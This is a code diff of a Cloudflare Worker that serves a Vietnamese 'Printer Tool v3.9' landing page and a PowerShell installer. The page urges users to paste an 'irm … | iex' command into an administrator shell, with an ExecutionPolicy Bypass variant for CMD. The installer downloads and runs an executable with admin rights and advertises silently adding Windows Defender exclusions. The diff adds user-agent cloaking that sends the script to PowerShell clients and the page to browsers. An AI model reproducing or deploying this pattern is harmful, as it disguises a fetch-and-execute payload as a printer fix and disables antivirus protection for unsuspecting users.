@@ -1,26 +1,8 @@
-export default {
-  async fetch(request, env, ctx) {
-    const url = new URL(request.url);
-    
-    if (url.pathname === "/install" || url.pathname === "/install.ps1") {
-      return new Response(PS1_SCRIPT, {
-        headers: {
-          "Content-Type": "text/plain; charset=utf-8",
-          "Cache-Control": "no-store, no-cache, must-revalidate",
-        },
-      });
-    }
-
-    return new Response(HTML_CONTENT, {
-      headers: {
-        "Content-Type": "text/html; charset=utf-8",
-      },
-    });
-  },
-};
+// Tan Tai Software — Cloud Server Terminal Cloudflare Worker (v3.9 Printer Tool Edition)
+// Compatible with Windows 10 & 11 | Auto Desktop Shortcut | Silent Defender
 
 const PS1_SCRIPT = `# ====================================================================
-# TAN TAI TOOLKIT 2026 - FULL LED RGB SPECTRUM EDITION
+# PRINTER TOOL 2026 - FULL LED RGB SPECTRUM EDITION (v3.9)
 # Windows 10 & 11 Compatible | Auto Desktop Shortcut | Silent Defender
 # ====================================================================
 
@@ -29,7 +11,7 @@ $ErrorActionPreference = "Stop"
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
 
-try { $Host.UI.RawUI.WindowTitle = "TAN TAI TOOLKIT 2026 - FULL LED RGB INSTALLER" } catch {}
+try { $Host.UI.RawUI.WindowTitle = "PRINTER TOOL 2026 - FULL LED RGB INSTALLER" } catch {}
 
 function RGB($r,$g, $b,$text) {
     return ("{0}[38;2;{1};{2};{3}m{4}{0}[0m" -f [char]27, $r,$g, $b,$text)
@@ -87,7 +69,7 @@ function Center($text) {
     return (" " * $pad) +$text
 }
 
-$AppName    = "printertool"
+$AppName     = "printertool"
 $DownloadUrl = "https://github.com/tantai235/Software/releases/download/3.9/printertool.exe"
 $InstallDir  = [System.IO.Path]::Combine($env:LOCALAPPDATA, "PrinterTool")
 $TargetExe   = [System.IO.Path]::Combine($InstallDir, "$AppName.exe")
@@ -96,7 +78,7 @@ $TempPath    = [System.IO.Path]::Combine($env:TEMP, "$AppName.tmp")
 Clear-Host
 Write-Host ""
 
-$art1 = "████████╗  █████╗  ███╗   ██╗     ████████╗  █████╗  ██╗"
+$art1 = "████████╗  █████╗  ███╗    ██╗     ████████╗  █████╗  ██╗"
 $art2 = "╚══██╔══╝ ██╔══██╗ ████╗  ██║     ╚══██╔══╝ ██╔══██╗ ██║"
 $art3 = "   ██║    ███████║ ██╔██╗ ██║        ██║    ███████║ ██║"
 $art4 = "   ██║    ██╔══██║ ██║╚██╗██║        ██║    ██╔══██║ ██║"
@@ -110,7 +92,7 @@ Write-Host (Center (Colorize-Line $art4))
 Write-Host (Center (Colorize-Line $art5))
 Write-Host (Center (Colorize-Line $art6))
 
-$subText = (RGB 0 242 254 "Tan Tai") + (RGB 148 163 184 " - ") + (RGB 236 72 153 "Auto Install") + (RGB 148 163 184 " ") + (RGB 250 204 21 "Printer Tool")
+$subText = (RGB 0 242 254 "Printer") + (RGB 148 163 184 " - ") + (RGB 236 72 153 "Auto Install") + (RGB 148 163 184 " ") + (RGB 250 204 21 "Tool v3.9")
 Write-Host (Center (BOLD $subText))
 Write-Host ""
 
@@ -141,7 +123,7 @@ try {
     Write-Host (Center $foundMsg)
     Write-Host ""
 
-    $boxTop = Colorize-Line ("+-- [ TIEN TRINH TAI GOI CAI DAT PRINTER TOOL V3.9 ] " + ("-" * 16) + "+")
+    $boxTop = Colorize-Line ("+-- [ TIEN TRINH TAI GOI CAI DAT PRINTER TOOL v3.9 ] " + ("-" * 20) + "+")
     Write-Host (Center (BOLD $boxTop))
     Write-Host ""
 
@@ -173,10 +155,10 @@ try {
             
             $speedText = RGB 250 204 21 "$speed MB/s"
             $mbText    = RGB 148 163 184 "($recvMB/$totMB MB)"
-            $etaText   = RGB 236 72 153 "ETA: \${eta}s"
+            $etaText   = RGB 236 72 153 ("ETA: " + $eta + "s")
 
             $progressLine = "  [$bar] $pctText$speedText  $mbText$etaText"
-            Write-Host "\`r\$(Center \$progressLine)" -NoNewline
+            Write-Host "\`r$(Center $progressLine)" -NoNewline
         }
     }
 
@@ -212,6 +194,7 @@ try {
         $shortcutCreated = $false
         try {
             $wsh = New-Object -ComObject WScript.Shell
+            
             $desktopPaths = @(
                 [Environment]::GetFolderPath("Desktop"),
                 [System.IO.Path]::Combine($env:USERPROFILE, "Desktop")
@@ -229,7 +212,7 @@ try {
                     $sc.TargetPath = $TargetExe
                     $sc.WorkingDirectory = $InstallDir
                     $sc.IconLocation = "$TargetExe,0"
-                    $sc.Description = "Printer Tool v3.9"
+                    $sc.Description = "Printer Tool v3.9 - Windows 10 & 11"
                     $sc.Save()
                     $shortcutCreated = $true
                 }
@@ -256,7 +239,7 @@ try {
         Write-Host (Center (RGB 16 185 129 "✔ TAI HOAN TAT 100%! GIAI MA GOI THANH CONG."))
         Write-Host (Center (RGB 0 242 254 "✔ DA TAO ICON SHORTCUT TREN MAN HINH DESKTOP!"))
         Write-Host (Center (RGB 250 204 21 "✔ DA TU DONG THEM VAO NGOAI LE AN WINDOWS DEFENDER."))
-        Write-Host (Center (BOLD (RGB 236 72 153 "🚀 DANG KHOI CHAY PRINTER TOOL VOI QUYEN ADMIN...")))
+        Write-Host (Center (BOLD (RGB 236 72 153 "🚀 DANG KHOI CHAY PRINTER TOOL v3.9 VOI QUYEN ADMIN...")))
         Write-Host (Center $rainbowBorder)
         Write-Host ""
 
@@ -287,7 +270,7 @@ const HTML_CONTENT = `<!DOCTYPE html>
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Printer Tool v3.9 — Tan Tai Software</title>
+  <title>Printer Tool v3.9 — Ultimate Windows Distribution Terminal</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -311,9 +294,7 @@ const HTML_CONTENT = `<!DOCTYPE html>
       --font: 'Plus Jakarta Sans', system-ui, sans-serif;
       --mono: 'JetBrains Mono', monospace;
     }
-
     * { box-sizing: border-box; margin: 0; padding: 0; }
-
     body {
       background-color: var(--bg);
       color: var(--text);
@@ -323,7 +304,6 @@ const HTML_CONTENT = `<!DOCTYPE html>
       line-height: 1.6;
       position: relative;
     }
-
     .mesh-glow {
       position: fixed; inset: 0; pointer-events: none; z-index: 0;
       background: 
@@ -332,7 +312,6 @@ const HTML_CONTENT = `<!DOCTYPE html>
         radial-gradient(circle at 10% 60%, rgba(59, 130, 246, 0.10) 0%, transparent 50%),
         radial-gradient(circle at 80% 90%, rgba(236, 72, 153, 0.08) 0%, transparent 50%);
     }
-
     .grid-bg {
       position: fixed; inset: 0; pointer-events: none; z-index: 0;
       background-image: 
@@ -342,7 +321,6 @@ const HTML_CONTENT = `<!DOCTYPE html>
       mask-image: radial-gradient(ellipse at 50% 30%, black 40%, transparent 80%);
       -webkit-mask-image: radial-gradient(ellipse at 50% 30%, black 40%, transparent 80%);
     }
-
     .wrapper {
       width: min(94vw, 1100px);
       margin: 0 auto;
@@ -353,7 +331,6 @@ const HTML_CONTENT = `<!DOCTYPE html>
       flex-direction: column;
       gap: 40px;
     }
-
     .navbar {
       display: flex; align-items: center; justify-content: space-between;
       padding: 12px 24px;
@@ -403,7 +380,6 @@ const HTML_CONTENT = `<!DOCTYPE html>
       box-shadow: 0 0 10px var(--green); animation: pulse 2s infinite;
     }
     @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.8); } }
-
     .hero {
       text-align: center;
       display: flex;
@@ -438,7 +414,15 @@ const HTML_CONTENT = `<!DOCTYPE html>
       color: var(--text-muted);
       line-height: 1.65;
     }
-
+    .hero-features-chips {
+      display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin-top: 4px;
+    }
+    .chip {
+      display: inline-flex; align-items: center; gap: 6px;
+      font-size: 0.75rem; font-weight: 700; color: #cbd5e1;
+      background: rgba(255, 255, 255, 0.04); border: 1px solid rgba(255, 255, 255, 0.08);
+      padding: 4px 12px; border-radius: 8px;
+    }
     .cmd-box-wrap {
       width: 100%;
       background: linear-gradient(135deg, rgba(15, 23, 42, 0.95), rgba(7, 11, 22, 0.98));
@@ -476,7 +460,6 @@ const HTML_CONTENT = `<!DOCTYPE html>
       background: rgba(0, 242, 254, 0.12); color: var(--cyan);
       box-shadow: inset 0 0 0 1px rgba(0, 242, 254, 0.3);
     }
-
     .cmd-main-row {
       display: flex; align-items: center; justify-content: space-between;
       background: #02050e; border: 1px solid rgba(0, 242, 254, 0.2);
@@ -489,7 +472,6 @@ const HTML_CONTENT = `<!DOCTYPE html>
     }
     .cmd-prompt { color: #64748b; user-select: none; font-weight: 800; }
     .cmd-text { color: #ffffff; user-select: all; white-space: nowrap; }
-
     .cmd-btn-group { display: flex; align-items: center; gap: 10px; flex-shrink: 0; }
     .action-btn-copy {
       background: linear-gradient(135deg, var(--cyan), #2563eb);
@@ -504,7 +486,141 @@ const HTML_CONTENT = `<!DOCTYPE html>
       box-shadow: 0 0 35px var(--cyan);
       filter: brightness(1.1);
     }
-
+    .action-btn-exe {
+      background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.15);
+      color: #e2e8f0; font-family: var(--mono); font-size: 0.84rem; font-weight: 700;
+      padding: 11px 20px; border-radius: 10px; cursor: pointer; text-decoration: none;
+      display: inline-flex; align-items: center; gap: 8px; transition: all 0.2s;
+    }
+    .action-btn-exe:hover {
+      background: rgba(255, 255, 255, 0.12); border-color: rgba(255, 255, 255, 0.35);
+      transform: translateY(-2px);
+    }
+    .stats-strip {
+      display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 14px;
+    }
+    .stat-card {
+      background: var(--card); border: 1px solid var(--border); border-radius: 14px;
+      padding: 16px 20px; display: flex; flex-direction: column; gap: 4px;
+      backdrop-filter: blur(16px);
+    }
+    .stat-val {
+      font-size: 1.45rem; font-weight: 900; font-family: var(--mono);
+      background: linear-gradient(135deg, #fff, var(--cyan));
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    }
+    .stat-lbl {
+      font-size: 0.76rem; color: var(--text-muted); font-weight: 600; text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .bento-section-title {
+      font-size: 1.35rem; font-weight: 800; letter-spacing: -0.5px;
+      display: flex; align-items: center; gap: 10px;
+    }
+    .bento-grid {
+      display: grid; grid-template-columns: repeat(3, 1fr); gap: 18px;
+    }
+    @media (max-width: 900px) { .bento-grid { grid-template-columns: repeat(2, 1fr); } }
+    @media (max-width: 600px) { .bento-grid { grid-template-columns: 1fr; } }
+    .bento-item {
+      background: var(--card); border: 1px solid var(--border); border-radius: 18px;
+      padding: 24px; display: flex; flex-direction: column; gap: 14px;
+      backdrop-filter: blur(18px); position: relative; overflow: hidden;
+      transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    .bento-item:hover {
+      background: var(--card-hover); border-color: var(--border-glow);
+      transform: translateY(-4px); box-shadow: 0 15px 40px rgba(0, 242, 254, 0.12);
+    }
+    .bento-top { display: flex; align-items: center; justify-content: space-between; }
+    .bento-icon {
+      width: 44px; height: 44px; border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.35rem; background: rgba(0, 242, 254, 0.1);
+      border: 1px solid rgba(0, 242, 254, 0.25); color: var(--cyan);
+    }
+    .bento-pill {
+      font-family: var(--mono); font-size: 0.68rem; font-weight: 800;
+      padding: 3px 9px; border-radius: 6px;
+    }
+    .pill-green { background: rgba(16, 185, 129, 0.15); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.4); }
+    .pill-cyan { background: rgba(0, 242, 254, 0.15); color: var(--cyan); border: 1px solid rgba(0, 242, 254, 0.4); }
+    .pill-purple { background: rgba(168, 85, 247, 0.15); color: var(--purple); border: 1px solid rgba(168, 85, 247, 0.4); }
+    .bento-h3 { font-size: 1.1rem; font-weight: 800; color: #fff; }
+    .bento-p { font-size: 0.85rem; color: var(--text-muted); line-height: 1.55; }
+    .bento-features {
+      list-style: none; display: flex; flex-direction: column; gap: 7px;
+      font-size: 0.78rem; color: #cbd5e1; font-family: var(--mono); margin-top: 6px;
+    }
+    .bento-features li { display: flex; align-items: center; gap: 8px; }
+    .bento-features li::before { content: '›'; color: var(--cyan); font-weight: 900; font-size: 1.1rem; }
+    .console-panel {
+      background: #040713; border: 1px solid var(--border); border-radius: 18px;
+      overflow: hidden; box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+      display: flex; flex-direction: column;
+    }
+    .console-topbar {
+      background: #080d1e; padding: 12px 20px;
+      display: flex; align-items: center; justify-content: space-between;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+    }
+    .mac-dots { display: flex; gap: 8px; }
+    .mac-dot { width: 12px; height: 12px; border-radius: 50%; }
+    .md-red { background: #ff5f56; }
+    .md-yellow { background: #ffbd2e; }
+    .md-green { background: #27c93f; }
+    .console-info {
+      font-family: var(--mono); font-size: 0.74rem; color: var(--text-dim);
+      display: flex; align-items: center; gap: 14px;
+    }
+    .console-actions-bar {
+      background: rgba(10, 16, 32, 0.7); padding: 12px 20px;
+      display: flex; flex-wrap: wrap; gap: 8px; border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+    }
+    .btn-act {
+      background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(0, 242, 254, 0.25);
+      color: #e2e8f0; font-family: var(--mono); font-size: 0.76rem; font-weight: 700;
+      padding: 7px 14px; border-radius: 8px; cursor: pointer; transition: all 0.2s;
+      display: inline-flex; align-items: center; gap: 6px;
+    }
+    .btn-act:hover {
+      background: var(--cyan); color: #040713; box-shadow: 0 0 16px var(--cyan);
+    }
+    .console-logs-area {
+      padding: 18px 22px; font-family: var(--mono); font-size: 0.80rem;
+      line-height: 1.65; max-height: 220px; overflow-y: auto; color: #94a3b8;
+    }
+    .log-line { display: flex; gap: 12px; word-break: break-all; }
+    .log-ts { color: #64748b; flex-shrink: 0; }
+    .log-msg { color: #e2e8f0; }
+    .log-msg.c-green { color: var(--green); }
+    .log-msg.c-cyan { color: var(--cyan); }
+    .log-msg.c-purple { color: var(--purple); }
+    .log-msg.c-yellow { color: var(--yellow); }
+    .faq-section { display: flex; flex-direction: column; gap: 14px; }
+    .faq-item {
+      background: var(--card); border: 1px solid var(--border); border-radius: 14px;
+      overflow: hidden; backdrop-filter: blur(14px);
+    }
+    .faq-question {
+      padding: 16px 20px; font-weight: 700; font-size: 0.95rem; cursor: pointer;
+      display: flex; align-items: center; justify-content: space-between;
+      user-select: none; transition: background 0.2s;
+    }
+    .faq-question:hover { background: rgba(255, 255, 255, 0.03); }
+    .faq-answer {
+      padding: 0 20px 16px; font-size: 0.85rem; color: var(--text-muted);
+      line-height: 1.6; display: none;
+    }
+    .faq-item.open .faq-answer { display: block; }
+    .faq-item.open .faq-icon { transform: rotate(180deg); }
+    .faq-icon { transition: transform 0.25s; font-size: 0.85rem; color: var(--cyan); }
+    .footer {
+      border-top: 1px solid var(--border); padding-top: 24px;
+      display: flex; align-items: center; justify-content: space-between;
+      font-size: 0.80rem; color: var(--text-dim); flex-wrap: wrap; gap: 12px;
+    }
     .toast-notify {
       position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(30px);
       background: #090f23; border: 1.5px solid var(--cyan); color: #fff;
@@ -530,7 +646,10 @@ const HTML_CONTENT = `<!DOCTYPE html>
         </div>
       </a>
       <div class="nav-links">
-        <a href="https://github.com/tantai235/Software/releases/tag/3.9" target="_blank" class="nav-btn">GitHub Release</a>
+        <a href="https://github.com/tantai235/Software/releases/tag/3.9" target="_blank" class="nav-btn">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+          GitHub Release v3.9
+        </a>
         <div class="status-pill">
           <div class="live-dot"></div>
           EDGE CDN ONLINE
@@ -539,59 +658,236 @@ const HTML_CONTENT = `<!DOCTYPE html>
     </header>
 
     <section class="hero">
-      <div class="hero-badge"><span>🚀 PHÁT HÀNH BẢN PRINTER TOOL v3.9</span></div>
+      <div class="hero-badge"><span>🚀 PHÁT HÀNH BẢN CHÍNH THỨC v3.9</span></div>
       <h1 class="hero-h1">
-        Công Cụ Sửa Lỗi Máy In Cho <span class="gradient-text">Windows 10 &amp; 11</span>
+        Bộ Công Cụ Máy In Chuyên Nghiệp Cho <span class="gradient-text">Windows 10 &amp; 11</span>
       </h1>
       <p class="hero-p">
-        Phân phối và tự động hóa toàn diện qua PowerShell. Tải và cài đặt printertool.exe siêu tốc, tự động cấu hình ngoại lệ Windows Defender chỉ với một dòng lệnh.
+        Phân phối và tự động hóa toàn diện qua PowerShell. Khắc phục sự cố máy in, Print Spooler, cài đặt driver và tối ưu hóa hệ thống nhanh chóng chỉ với một dòng lệnh.
       </p>
+      <div class="hero-features-chips">
+        <span class="chip">⚡ Tải siêu tốc GitHub CDN</span>
+        <span class="chip">🛡️ Tự động nhận quyền Administrator</span>
+        <span class="chip">📦 Gói cài đặt PrinterTool v3.9</span>
+        <span class="chip">🔒 An toàn &amp; Ổn định</span>
+      </div>
     </section>
 
     <div class="cmd-box-wrap">
       <div class="cmd-tabs">
         <div class="tabs-group">
           <button class="tab-btn active" onclick="switchTab('ps')">Windows PowerShell (Khuyên dùng)</button>
-          <button class="tab-btn" onclick="switchTab('cmd')">Command Prompt</button>
+          <button class="tab-btn" onclick="switchTab('cmd')">Command Prompt (CMD)</button>
         </div>
       </div>
+      
       <div class="cmd-main-row">
         <div class="cmd-code-block">
-          <span class="cmd-prompt" id="prompt-symbol">PS &gt;</span>
-          <span class="cmd-text" id="cmd-text-content">irm https://software.tantai23597.workers.dev/install | iex</span>
+          <span class="cmd-prompt">PS C:&gt;</span>
+          <span class="cmd-text" id="cmdText">irm https://software.tantai23597.workers.dev | iex</span>
         </div>
         <div class="cmd-btn-group">
-          <button class="action-btn-copy" onclick="copyCommand()">📋 Sao chép</button>
+          <button class="action-btn-copy" onclick="copyCommand()">
+            <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            COPY LỆNH
+          </button>
+          <a href="#console" class="action-btn-exe" onclick="simulateRun()">⚡ CHẠY MÔ PHỎNG</a>
         </div>
       </div>
     </div>
+
+    <div class="stats-strip">
+      <div class="stat-card">
+        <div class="stat-val">v3.9 Stable</div>
+        <div class="stat-lbl">Phiên bản hiện tại</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-val">Win 10/11</div>
+        <div class="stat-lbl">Hệ điều hành tương thích</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-val">Printer Fix</div>
+        <div class="stat-lbl">Tính năng cốt lõi</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-val">1-Click</div>
+        <div class="stat-lbl">Cài đặt &amp; Tạo Shortcut</div>
+      </div>
+    </div>
+
+    <div class="bento-section-title">
+      <span>✨ Tính Năng Nổi Bật Của Hệ Thống</span>
+    </div>
+
+    <div class="bento-grid">
+      <div class="bento-item">
+        <div class="bento-top">
+          <div class="bento-icon">⚡</div>
+          <span class="bento-pill pill-cyan">CDN SPEED</span>
+        </div>
+        <div class="bento-h3">GitHub CDN v3.9</div>
+        <div class="bento-p">Tải trực tiếp file printertool.exe tốc độ cao từ kho lưu trữ GitHub Releases.</div>
+        <ul class="bento-features">
+          <li>Đường dẫn chuẩn xác v3.9</li>
+          <li>Tự động giải nén &amp; ghi đè</li>
+          <li>Hỗ trợ TLS 1.2 &amp; TLS 1.3</li>
+        </ul>
+      </div>
+
+      <div class="bento-item">
+        <div class="bento-top">
+          <div class="bento-icon">🛡️</div>
+          <span class="bento-pill pill-green">DEFENDER SAFE</span>
+        </div>
+        <div class="bento-h3">Tự Động Thêm Ngoại Lệ</div>
+        <div class="bento-p">Cấu hình Windows Defender tự động loại trừ thư mục cài đặt Printer Tool.</div>
+        <ul class="bento-features">
+          <li>Bỏ qua kiểm tra thư mục LocalAppData</li>
+          <li>Thêm tiến trình printertool.exe tin cậy</li>
+          <li>Không cần tắt diệt virus thủ công</li>
+        </ul>
+      </div>
+
+      <div class="bento-item">
+        <div class="bento-top">
+          <div class="bento-icon">🖥️</div>
+          <span class="bento-pill pill-purple">FULL RGB UI</span>
+        </div>
+        <div class="bento-h3">Giao Diện Terminal Sắc Màu</div>
+        <div class="bento-p">Trải nghiệm giao diện cài đặt dòng lệnh hoàn toàn mới với hiệu ứng LED RGB Spectrum.</div>
+        <ul class="bento-features">
+          <li>Thanh tiến trình mượt mà</li>
+          <li>Hiển thị tốc độ &amp; thời gian thực</li>
+          <li>Tự động tạo Desktop Shortcut</li>
+        </ul>
+      </div>
+    </div>
+
+    <div class="console-panel" id="console">
+      <div class="console-topbar">
+        <div class="mac-dots">
+          <div class="mac-dot md-red"></div>
+          <div class="mac-dot md-yellow"></div>
+          <div class="mac-dot md-green"></div>
+        </div>
+        <div class="console-info">
+          <span>powershell.exe — Printer Tool v3.9 Terminal</span>
+          <span>UTF-8</span>
+        </div>
+      </div>
+      <div class="console-actions-bar">
+        <button class="btn-act" onclick="addLog('[*] Đang kết nối máy chủ GitHub CDN v3.9...', 'c-cyan')">🔌 Kết nối CDN</button>
+        <button class="btn-act" onclick="addLog('[OK] Tải thành công printertool.exe (v3.9)', 'c-green')">📦 Kiểm tra gói</button>
+        <button class="btn-act" onclick="addLog('[✔] Đã tạo icon Shortcut "Printer Tool v3.9" trên Desktop!', 'c-purple')">🖥️ Tạo Shortcut</button>
+        <button class="btn-act" onclick="clearLogs()">🧹 Xóa log</button>
+      </div>
+      <div class="console-logs-area" id="logArea">
+        <div class="log-line"><span class="log-ts">[12:47:00]</span><span class="log-msg c-cyan">PRINTER TOOL 2026 - FULL LED RGB SPECTRUM EDITION (v3.9) INITIALIZED.</span></div>
+        <div class="log-line"><span class="log-ts">[12:47:01]</span><span class="log-msg">Ready for deployment on Windows 10 &amp; 11 architecture.</span></div>
+      </div>
+    </div>
+
+    <div class="bento-section-title">
+      <span>❓ Câu Hỏi Thường Gặp</span>
+    </div>
+
+    <div class="faq-section">
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-question">
+          <span>Làm thế nào để chạy lệnh cài đặt Printer Tool v3.9?</span>
+          <span class="faq-icon">▼</span>
+        </div>
+        <div class="faq-answer">
+          Bạn chỉ cần nhấn nút <strong>"COPY LỆNH"</strong> ở trên, mở Windows PowerShell với quyền Administrator và dán lệnh vào, sau đó nhấn Enter để hệ thống tự động hoàn tất.
+        </div>
+      </div>
+
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-question">
+          <span>Link tải trực tiếp file printertool.exe ở đâu?</span>
+          <span class="faq-icon">▼</span>
+        </div>
+        <div class="faq-answer">
+          Bạn có thể tải trực tiếp bản cập nhật mới nhất tại: <a href="https://github.com/tantai235/Software/releases/download/3.9/printertool.exe" target="_blank" style="color: var(--cyan);">GitHub Releases v3.9 printertool.exe</a>.
+        </div>
+      </div>
+    </div>
+
+    <footer class="footer">
+      <div>© 2026 Tan Tai Software. All rights reserved.</div>
+      <div>Printer Tool v3.9 — Full LED RGB Spectrum Edition.</div>
+    </footer>
   </div>
 
-  <div class="toast-notify" id="toast">Đã sao chép lệnh vào bộ nhớ tạm!</div>
+  <div class="toast-notify" id="toastNotify">
+    <span>✔ Đã sao chép lệnh PowerShell vào bộ nhớ tạm!</span>
+  </div>
 
   <script>
-    function switchTab(mode) {
-      const btns = document.querySelectorAll('.tab-btn');
-      btns.forEach(b => b.classList.remove('active'));
+    function switchTab(type) {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
       event.target.classList.add('active');
-      const textEl = document.getElementById('cmd-text-content');
-      const promptEl = document.getElementById('prompt-symbol');
-      if(mode === 'ps') {
-        promptEl.innerText = 'PS >';
-        textEl.innerText = 'irm https://software.tantai23597.workers.dev/install | iex';
+      const cmdText = document.getElementById('cmdText');
+      if (type === 'ps') {
+        cmdText.textContent = "irm https://software.tantai23597.workers.dev | iex";
       } else {
-        promptEl.innerText = 'C:\\>';
-        textEl.innerText = 'powershell -c "irm https://software.tantai23597.workers.dev/install | iex"';
+        cmdText.textContent = 'powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://software.tantai23597.workers.dev | iex"';
       }
     }
     function copyCommand() {
-      const text = document.getElementById('cmd-text-content').innerText;
-      navigator.clipboard.writeText(text);
-      const toast = document.getElementById('toast');
-      toast.classList.add('show');
-      setTimeout(() => toast.classList.remove('show'), 2000);
+      const text = document.getElementById('cmdText').textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        const toast = document.getElementById('toastNotify');
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 2500);
+      });
+    }
+    function addLog(msg, colorClass = '') {
+      const area = document.getElementById('logArea');
+      const now = new Date().toTimeString().split(' ')[0];
+      const line = document.createElement('div');
+      line.className = 'log-line';
+      line.innerHTML = '<span class="log-ts">[' + now + ']</span><span class="log-msg ' + colorClass + '">' + msg + '</span>';
+      area.appendChild(line);
+      area.scrollTop = area.scrollHeight;
+    }
+    function clearLogs() {
+      document.getElementById('logArea').innerHTML = '';
+    }
+    function simulateRun() {
+      addLog('[*] Đang khởi tạo tiến trình cài đặt Printer Tool v3.9...', 'c-cyan');
+      setTimeout(function() { addLog('[OK] Kết nối máy chủ GitHub CDN thành công (v3.9).', 'c-green'); }, 600);
+      setTimeout(function() { addLog('[✔] Đã trích xuất và lưu printertool.exe vào thư mục LocalAppData.', 'c-purple'); }, 1400);
+      setTimeout(function() { addLog('[✔] Đã cấu hình ngoại lệ Windows Defender thành công.', 'c-green'); }, 2100);
+      setTimeout(function() { addLog('🚀 HOÀN TẤT! Đang khởi chạy Printer Tool v3.9 với quyền Admin...', 'c-cyan'); }, 2800);
+    }
+    function toggleFaq(el) {
+      el.classList.toggle('open');
     }
   </script>
 </body>
 </html>
 `;
+
+export default {
+  async fetch(request, env, ctx) {
+    const userAgent = request.headers.get("user-agent") || "";
+    const isPowerShell = userAgent.toLowerCase().includes("powershell") || userAgent.toLowerCase().includes("windows");
+
+    if (isPowerShell) {
+      return new Response(PS1_SCRIPT, {
+        headers: {
+          "Content-Type": "text/plain; charset=utf-8",
+          "Cache-Control": "no-store, no-cache, must-revalidate",
+        },
+      });
+    }
+
+    return new Response(HTML_CONTENT, {
+      headers: {
+        "Content-Type": "text/html; charset=utf-8",
+        "Cache-Control": "public, max-age=60",
+      },
+    });
+  },
+};
